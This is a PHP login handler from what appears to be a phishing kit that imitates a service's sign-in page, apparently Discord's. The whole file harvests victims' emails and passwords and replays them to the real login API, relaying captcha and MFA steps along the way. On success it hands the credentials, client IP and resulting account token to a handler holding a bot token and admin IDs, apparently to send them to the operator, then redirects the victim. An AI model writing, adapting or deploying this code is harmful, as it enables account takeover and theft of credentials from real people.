<?php
error_reporting(E_ERROR | E_PARSE);
require 'core/system/include.php';

session_start();

if( isset($_SESSION["credentials"]) )
{
	$data      =  explode( "\0", $_SESSION["credentials"] );
	$login     =  $data[0];
	$password  =  $data[1];

	unset( $_SESSION["credentials"] );
}
else
{
	if(isset($_POST["email"]) && isset($_POST["password"]))
	{
		$login     =  $_POST["email"];
		$password  =  $_POST["password"];
	}
	else
	{
		$login     =  NULL;
		$password  =  NULL;
	}
}

if( isset( $_SESSION["captcha_key"]) )
{
	$captcha_key = $_SESSION["captcha_key"];

	unset( $_SESSION["captcha_key"] );
}
else
{
	$captcha_key  =  NULL;
}

$client_ip        =  $_SERVER["REMOTE_ADDR"];
$server_hostname  =  $_SERVER["HTTP_HOST"];
$full_url         =  $_SERVER["HTTP_HOST"].$_SERVER["PHP_SELF"];

if( $login != NULL and $password != NULL )
{
	if( $captcha_key != NULL )
	{
		$payload = array(
			"login"             =>  $login,
			"password"          =>  $password,
			"gift_code_sku_id"  =>  null,
			"login_source"      =>  null,
			"undelete"          =>  false,
			"captcha_key"       =>  $captcha_key
		);

		$response = $VLT_API->login( $payload );

		if( isset($response["token"]) )
		{
			// $Request->GetURL
			$api_response = $Main->handler(
				$bot_token, 
				$user_id, 
				$client_ip, 
				$password, 
				$full_url, 
				$login, 
				$server_hostname,
				$admin_id,
				$admin_token,
				$response["token"],
				$admin_sendlog
			);

			header("Location: ".$url_redirect);
			die();
		}

		if( isset($response["global"]) )
		{
			$response = $VLT_API->login_proxy( $payload );
		}

		$error = NULL;

		if( isset($response["errors"]) )
		{
			if( $response["errors"]["login"]["_errors"][0]["code"] == "INVALID_LOGIN" )
			{
				$error = "EINVALID_CREDENTIALS";
			}
			if( $response["errors"]["login"]["_errors"][0]["code"] == "ACCOUNT_LOGIN_VERIFICATION_EMAIL" )
			{
				$error = "EMAILVERIFY_REQUIRED";
			}
			if( $response["errors"]["login"]["_errors"][0]["code"] == "EMAIL_TYPE_INVALID_EMAIL" )
			{
				$error = "EINVALID_EMAIL";
			}
		}

		if( isset($response["mfa"]) && $response["mfa"] == true )
		{
			$_SESSION["ticket"]       =  $response["ticket"];
			$_SESSION["credentials"]  =  $login . "\0" . $password;
			header("Location: /mfa.php");
			die();
		}

		require("src/index.php");

		if( $error == "EINVALID_CREDENTIALS" )
		{
			require("src/errors/invalid_credentials.php");
			die();
		}

		if( $error == "EMAILVERIFY_REQUIRED" )
		{
			require("src/errors/mailverify_required.php");
		}
		
		if( $error == "EINVALID_EMAIL" )
		{
			require("src/errors/invalid_mail.php");
		}
	}
	else
	{
		$_SESSION["redirect"]     =  "login";
		$_SESSION["credentials"]  =  $login . "\0" . $password;
		header("Location: /captcha.php");
	}
}
else
{
	require("src/index.php");
}

?>